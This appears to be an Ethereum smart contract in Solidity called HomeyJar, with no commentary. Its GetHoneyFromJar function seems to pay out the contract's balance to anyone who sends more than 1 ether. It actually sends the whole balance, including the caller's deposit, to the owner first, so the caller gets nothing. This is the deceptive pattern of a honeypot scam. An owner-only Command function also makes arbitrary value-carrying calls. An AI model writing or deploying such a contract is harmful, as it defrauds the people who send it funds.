pragma solidity ^0.4.19;

contract HomeyJar {
    address public Owner = msg.sender;

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        require(adr.call.value(msg.value)(data));
    }
}